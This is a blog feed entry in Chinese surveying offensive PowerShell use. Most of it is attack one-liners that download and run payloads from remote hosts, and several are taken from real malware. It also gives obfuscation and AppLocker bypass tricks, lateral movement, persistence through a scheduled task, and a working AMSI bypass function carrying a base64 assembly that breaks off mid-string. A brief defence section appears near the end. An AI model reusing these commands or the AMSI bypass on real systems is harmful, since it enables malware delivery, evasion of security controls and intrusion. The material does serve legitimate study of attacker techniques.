<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s0lt&#39;s Blog</title>
  
  <subtitle>记录一切美好的</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://s0lt.github.io/"/>
  <updated>2019-02-28T01:05:43.081Z</updated>
  <id>https://s0lt.github.io/</id>
  
  <author>
    <name>s0lt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>powershell渗透使用研究</title>
    <link href="https://s0lt.github.io/2019/02/28/powershell%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://s0lt.github.io/2019/02/28/powershell渗透中的学习/</id>
    <published>2019-02-28T01:02:21.000Z</published>
    <updated>2019-02-28T01:05:43.081Z</updated>
    
    <content type="html"><![CDATA[<p>本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。</p><h3 id="主要讨论"><a href="#主要讨论" class="headerlink" title="主要讨论"></a>主要讨论</h3><p>Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题</p><h3 id="脚本执行策略"><a href="#脚本执行策略" class="headerlink" title="脚本执行策略"></a>脚本执行策略</h3><p>查看当前系统的策略<br>powershell为了防护恶意脚本的执行，设置了相应的执行策略。<br><code>Get-ExecutionPolicy</code><br>查看系统支持的所有策略<br><code>[System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])</code><br><img src="/images/celue.png" alt=""></p><a id="more"></a><table><thead><tr><th>策略</th><th>说明</th></tr></thead><tbody><tr><td>Unrestricted</td><td>允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示</td></tr><tr><td>RemoteSigned</td><td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td></tr><tr><td>AllSigned</td><td>允许执行所有具有数字签名的脚本</td></tr><tr><td>Restriceted</td><td>可以执行单个的命令，但是不能执行脚本</td></tr><tr><td>Default</td><td>Powershell默认的策略</td></tr><tr><td>Bypass</td><td>任何脚本都可以执行，并且不会有安全性提示。</td></tr><tr><td>Undefined</td><td>没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略</td></tr></tbody></table><h4 id="策略的绕过"><a href="#策略的绕过" class="headerlink" title="策略的绕过"></a>策略的绕过</h4><p>使用echo或者type将脚本内容pipe到powershell的标准输入中<br><code>TYPE myScript.ps1 | Powershell.exe -noprofile</code><br>使用-command命令下载脚本并执行<br><code>powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘http://[REMOVED]/myScript.ps1’)”</code><br>使用-enc对命令进行编码<br><code>powershell.exe -enc [ENCODED COMMAND]</code><br>使用执行策略“bypass”或者“unrestricted”<br><code>powershell.exe -ExecutionPolicy bypass -File myScript.ps1</code><br>更改注册表执行策略<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></p><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-NoP / -NoProfile（忽略配置文件中的命令）</span><br><span class="line">-Enc / -EncodedCommand（运行Base64编码的命令）</span><br><span class="line">-W Hidden/-WindowStyle Hidden（隐藏命令</span><br><span class="line">窗口）</span><br><span class="line">-Exec bypass / -ExecutionPolicy Bypass（忽略</span><br><span class="line">执行政策限制）</span><br><span class="line">-NonI / -NonInteractive（不运行交互式shell）</span><br><span class="line">-C / -Command（运行单个命令）</span><br><span class="line">-F / -File（从指定文件运行命令）</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(New-Object System.Net.Webclient).DownloadString()</span><br><span class="line">(New-Object System.Net.Webclient).DownloadFile()</span><br><span class="line">-IEX / -Invoke-Expression</span><br><span class="line">Start-Process</span><br></pre></td></tr></table></figure><p>System.Net类常用于像远程发送或接受数据,下载和执行文件的典型命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).</span><br><span class="line">DownloadFile($URL,$LocalFileLocation);Start-Process</span><br><span class="line">$LocalFileLocation</span><br></pre></td></tr></table></figure></p><p>Webclient API 不是唯一的下载方式，但是最常用的。<br>通常下载远程脚本后，远程脚本使用Invoke-Expression来运行直接加载到内存或者缓冲区的恶意代码。常见的还有Invoke-WMIMethod和New-Service，或者为WScript或者创建一个新的COM对象<br>shell应用程序来执行有效负载。 这个命令看起来<br><code>（New-object -com Shell.Application）.ShellExecute（）</code></p><h3 id="powershell攻击中常用命令"><a href="#powershell攻击中常用命令" class="headerlink" title="powershell攻击中常用命令"></a>powershell攻击中常用命令</h3><p><code>powershell -w hidden -ep bypass -nop -c “IEX ((New-Object System.Net.Webclient).DownloadString(‘http://pastebin.com/raw/[REMOVED]’))”</code></p><p><code>powershell.exe -window hidden -enc KABOAG[REMOVED]</code></p><p><code>Cmd.exe /C powershell $random = New-Object System.Random; Foreach($url in @({http://[REMOVED]academy.com/wp-content/themes/twentysixteen/st1.exe},{http://[REMOVED].com.au/wp-content/plugins/espresso-social/st1.exe},{http://[REMOVED].net/wp-includes/st1.exe},{http://[REMOVED]resto.com/wp-content/plugins/wp-super-cache/plugins/st1.exe},{http://[REMOVED].ru/wp-content/themes/twentyeleven/st1.exe})) { try{ $rnd = $random.Next(0, 65536); $path = ‘%tmp%\’+ [string] $rnd + ‘.exe’; (New-Object System.Net.Start-Process $path; break; } catch { Write-Host$error[0].Exception } }</code><br><code>powershell.exe iex $env:nlldxwx</code><br><code>cmd.exe /c pow^eRSheLL^.eX^e^-e^x^ec^u^tI^o^nP^OLIcY^ ByP^a^S^s -nOProf^I^L^e^-^WIndoWST^YLe H^i^D^de^N ^(ne^w-O^BJe^c^T ^SY^STeM.Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?f=1.dat’,^’%USERAPPDATA%.eXe’);s^T^ar^T-^PRO^ce^s^S^ ^%USERAPPDATA%.exe</code></p><p><code>powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command “Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream(,$([Convert]::FromBase64String(\”[REMOVED]\” )))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();”</code></p><p><code>powershell.exe -ExecutionPolicy Unrestricted -File “%TEMP%\ps.ps1”</code><br><code>powershell.exe -windowstyle hidden (new-object System.Net.WebClient.DownloadFile(‘http://[REMOVED]’,’%Temp%\[RANDOM].exe’);Start-Process ‘%Temp%\[RANDOM].exe’</code></p><h3 id="常用横向移动方法"><a href="#常用横向移动方法" class="headerlink" title="常用横向移动方法"></a>常用横向移动方法</h3><ul><li>Invoke-Command(可以在远程计算机上执行)<br><code>Invoke-Command -ComputerName $RemoteComputer-ScriptBlock {Start-Process ‘C:\myCalc.exe’} -credential (Get-Credential)</code></li><li>Enter-PSSession（交互式shell或创建新后台会话）<br><code>Enter-PSSession -ComputerName 192.168.1.2 -Credential $credentials</code></li><li>WMI/wmic/Invoke-WMImethod<br><code>([WMICLASS]”\\$IP\ROOT\CIMV2:win32_process”).Create($Command2run)</code><br><code>wmic /NODE:[SERVER NAME] process call create “powershell.exe -Enc ‘[PAYLOAD]‘”</code><br><code>Get-WmiObject -Namespace “root\cimv2” -Class Win32_Process -Impersonation 3 -Credential MYDOM\administrator -ComputerName $Computer</code></li><li>Profile injection</li><li>Tesk Sheduler</li><li>Common tools(PsExec)<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4></li><li>注册表</li><li>任务计划</li><li>策略组</li><li>启动目录</li><li>感染配置文件</li><li>WMI</li></ul><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><h4 id="常用方法和例子"><a href="#常用方法和例子" class="headerlink" title="常用方法和例子"></a>常用方法和例子</h4><ol><li>大小写混淆<br><code>(neW-oBjEct system.NeT.WeBclieNT).dOWNloadfiLe</code></li><li>省略”Get”<br>Get-Command等价于Command.</li><li>省略”System”<br>Net.WebClient等价于System.Net.Webclient</li><li>字符串连接<br>(New-Object Net.WebClient).DownloadString(“ht”+’tp://’+$url)</li><li>可插入空格<br>( New-Object Net.WebClient ).DownloadString( $url)</li><li>多个命令执行类似操作<br>DownloadString 和OpenRead、Invoke-WebRequest类似</li><li>变量可被设置为对象<br>$webcl=New-Object Net.Webclient; $webcl.DownloadString($url)</li><li>单引号或双引号可包含成员参数<br>‘DownloadFile’</li><li>“`“的使用<br><code>(new-object net.webclient).”d</code>o<code>wnl</code>oa<code>dstr</code>in<code>g”($url)</code></li><li>Get-Command<br>&amp;(Get-Command New-Ob*)</li><li>使用别名<br>Get-Command 别名GCM</li><li>Invoke-Command等于.Invoke()<br>(New-Object Net.WebClient).DownloadString.invoke($url) </li><li>数字代替参数<br>“-window 1” 代替 “-window hidden”</li><li>使用Powershell 1.0中的旧语法<br>Scriptblock 转换</li><li>字符串编码（hex,ASCI)</li><li>使用字符串操作，例如字符串反转，字符串替换，字符串拆分<br>(New-Object Net.WebClient).Downloadstring((“<a href="http://myGoodSite.tld”" target="_blank" rel="noopener">http://myGoodSite.tld”</a> -replace “Good” “attacker”))</li><li>“-f”运算符格式化字符串<br>(New-Object Net.WebClient).Downloadstring((“http://{2}{1}”-f ‘no’,’.TLD’,’myAttackerSite’))</li><li>字符串编码解码，如base64，UTF-8</li><li>字符串加密，如XOR<br>混淆组合例子<br><code>%SYSTEM%\cmd.exe /c poWerSheLL.exe -eXecutio^nPOlIcy ByPasS^ -n^op^rO^fi^l^e -wIN^dOW^s^tyLe^ hI^d^den^ (n^ew^-^OB^Ject^^s^Y^S^tem^.ne^t.we^Bcl^i^ent^)^.^do^wnlo^adf^Ile(^’http://[REMOVED]/user.php?f=1.dat’,’%USERAPPDATA%.eXe’);^S^tart-^PR^O^ce^SS^ %USERAPPDATA%.eXe</code></li></ol><h4 id="常用混淆工具"><a href="#常用混淆工具" class="headerlink" title="常用混淆工具"></a>常用混淆工具</h4><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">Invoke-Obfuscation</a> </p><h3 id="powershell-exe黑名单绕过"><a href="#powershell-exe黑名单绕过" class="headerlink" title="powershell.exe黑名单绕过"></a>powershell.exe黑名单绕过</h3><ol><li>Msbuild.exe绕过<br>msbuild.exe C:\MSBuildShell.csproj</li><li>混淆<br><code>%SYSTEM%\cmd.exe /c ping localhost &amp; powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(‘http://[REMOVED]/wp-admin/f915df4a50447.exe’,’%USERAPPDATA%cNZ49.exe’); stARtProcEss ‘%USERAPPDATA%cNZ49.exe’</code></li><li>恶意脚本存储在环境变量中，通过变量调用执行脚本(基于行为的检测绕过，将行为模块化，如使用type将内容复制到剪切板，通过另外的实例从这些位置执行攻击)<br><code>cmd.exe /c “set myName=[COMMAND] &amp;&amp; powershell IEX $env:myName”</code></li><li>检查运行环境<br><code>(get-process|select-string -pattern vboxservice,vboxtray,proxifier,prl_cc,prl_tools,vmusrvc,vmsrvc,vmtoolsd).count</code></li></ol><h3 id="恶意软件中常用例子"><a href="#恶意软件中常用例子" class="headerlink" title="恶意软件中常用例子"></a>恶意软件中常用例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“cmd /K “ + “pow” + “eR” &amp; “sh” + “ell.e” + “x” + “e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(‘http://[REMOVED]/file.php’,’%TEMP%\Y.ps1’); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1”</span><br></pre></td></tr></table></figure><p>包含恶意宏代码的文档，打开后脚本在％public％\Libraries\RecordedTV\下创建三个文件夹。然后宏执行一个很长的PowerShell命令行。 此脚本存储一些工作簿<br>有效负载在名为backup.vbs的文件中，并创建两个PowerShell脚本，DnE.ps1和DnS.ps1。<br>基于宏的powershell代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd = “powershell “”&amp;&#123;$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBas” &amp; “e64String(‘” &amp; BackupVbs &amp; “’)); Set-Content ‘” &amp; pth &amp; “backup.vbs” &amp; “’ $f;$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBas” &amp; “e64String(‘” &amp; DnEPs1 &amp; “’)); $f=$f -replace ‘__’,(Get-Random);</span><br><span class="line">$f=’powershell -EncodedCommand \””’+([System.Convert]::ToBas” &amp; “e64String([System.Text.Encoding]::Unicode.GetBytes($f)))+’\””’;Set-Content ‘” &amp; pth &amp; “DnE.ps1” &amp; “’ $f;$f=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBas” &amp; “e64String(‘” &amp; DnSPs1 &amp; “’));$f=’powershell -EncodedCommand \””’+([System.Convert]::ToBas” &amp; “e64String([System.Text.Encoding]::Unicode.GetBytes($f)))+’\””’;Set-Content ‘” &amp; pth &amp; “DnS.ps1” &amp; “’ $f&#125;”””</span><br></pre></td></tr></table></figure></p><p>创建定期执行任务计划的脚本<br><code>%SYSTEM%\schtasks.exe /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr %ALLUSERSPROFILE%\Libraries\RecordedTV\backup.vbs</code><br>backup.vbs运行powershell脚本<br><code>powershell -ExecutionPolicy Bypass -File “&amp;HOME&amp;”DnE.ps1</code><br><code>powershell -ExecutionPolicy Bypass -File “&amp;HOME&amp;”DnS.ps1</code><br>此脚本从远程下载命令，运行他们，并上传结果。</p><h4 id="TROJANS-后门"><a href="#TROJANS-后门" class="headerlink" title="TROJANS 后门"></a>TROJANS 后门</h4><p>使用80/443端口创建通道，使用DownloadString和Net.Webclient方法通信，使用Invoke-Expression执行命令，提供几种加载有效载荷的方法<br>比如使用rundll32来启动a，然后执行PowerShell命令行的JavaScript。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:”\..\mshtml,RunHTMLApplication “;document.write();r=new%20ActiveXObject(“WScript.Shell”).run(“powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString(‘[IP ADDRESS]/script.ps1’))”,0,true);</span><br></pre></td></tr></table></figure></p><p>另一种选择是生成包含COM 的scriptlet（.sct）脚本。<br><code>regsvr32.exe /u /n /s /i:http://[IP ADDRESS]:80/file.sct scrobj.dll</code>  （可绕过APPLocker限制）</p><p>推荐：<a href="https://xz.aliyun.com/t/2529" target="_blank" rel="noopener">DarkHydrus powershell恶意软件</a> </p><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><p>PowerSploit<br>PowerShell Empire<br>NiShang<br>PS&gt;Attack<br>Mimikatz </p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>注意垃圾邮件</li><li>最好不要启用宏功能</li><li>不使用powershell.exe的情况下禁用</li><li>设置脚本执行策略</li><li>限制powershell一些功能，例如com对象和系统同APi等功能，删除不使用的版本（powershell2.0可以绕过日志记录和限制）</li><li>使用Cmdlets 限制执行的目录和用户</li><li>JEA限制远程管理的权限</li><li>设置注册表启用powershell日志记录<pre><code>`HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\`</code></pre>当脚本运行见，运行如下命令更新日志 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> Windows PowerShell.evtx</span><br><span class="line">Microsoft-WindowsPowerShell/Operational.evtx</span><br><span class="line">Microsoft-WindowsWinRM/Operational.evtx</span><br></pre></td></tr></table></figure></li></ol><h3 id="AMIS"><a href="#AMIS" class="headerlink" title="AMIS"></a>AMIS</h3><p>windows新安全功能，可通过卸载和使用旧版本powrshell绕过</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>AMSI 使用”基于字符串”的检测措施来确定PowerShell代码是否为恶意代码。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol><li>使用字符拼接、base64编码、xor加密混淆绕过<br>通过memory patch来完全禁用AMSI在代码执行前的函数<br>禁用AMSI的PowerShell脚本:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Bypass-AMSI</span><br><span class="line">&#123;</span><br><span class="line">    if(-not ([System.Management.Automation.PSTypeName]&quot;Bypass.AMSI&quot;).Type) &#123;</span><br><span class="line">        [Reflection.Assembly]::Load([Convert]::FromBase64String(&quot;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N0RBQ0VEAEJ5cGFzc0FNU0kAbXNjb3JsaWIAc3JjAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1NpemUAc2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEFsbG9jSEdsb2JhbABNYXJzaGFsAEtlcm5lbDMyLmRsbABCeXBhc3NBTVNJLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ab3BfQWRkaXRpb24AWmVybwAuY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSdW50aW1lSGVscGVycwBCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAAAABFhAG0AcwBpAC4AZABsAGwAAFdFAFIAUgBPAFIAOgAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHQAcgBpAGUAdgBlACAAYQBtAHMAaQAuAGQAbABsACAAcABvAGkAbgB0AGUAcgAuAAAdQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByAABzRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAEEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAgAGYAdQBuAGMAdABpAG8AbgAgAHAAbwBpAG4AdABlAHIAAHVFAFIAUgBPAFIAOgAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAYwBoAGEAbgBnAGUAIABBAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBlAHIAIABtAGUAbQBvAHIAeQAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAhAABNQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByACAAcABhAHQAYwBoACAAaABhAHMAIABiAGUAZQBuACAAYQBwAHAAbABpAGUAZAAuAAAAAABNy6E5KHzvRJzwgzKCw/hXAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIHBwUYGBkJGAIGGAUAAgIYGAQAAQEOBAABGQsHAAIBEmERZQQAARgICAAEAR0FCBgIBQACGBgICLd6XFYZNOCJAwYREAUAAhgYDgQAARgOCAAEAhgZCRAJBgADARgYCAMAAAgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADwEACkJ5cGFzc0FNU0kAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTgAACkBACQ4Y2ExNGM0OS02NDRiLTQwY2YtYjFjNy1hNWJkYWViMGIyY2EAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjUuMgEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC41LjIEAQAAAAAAAAAAAN3BR94AAAAAAgAAAGUAAAAMLAAADA4AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTac9x8RJ6SEet9F+qmVae0gEAAABDOlxVc2Vyc1xhbmRyZVxzb3VyY2VccmVwb3NcQnlwYXNzQU1TSVxCeXBhc3NBTVNJXG9ialxSZWxlYXNlXEJ5cGFzc0FNU0kucGRiAJksAAAAAAAAAAAAALMsAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAClLAAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAAAAAD/JQAgABAx/5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABCAHkAcABhAHMAcwBBAE0AUwBJAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEIAeQBwAGEAcwBzAEEATQBTAEkALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATABlA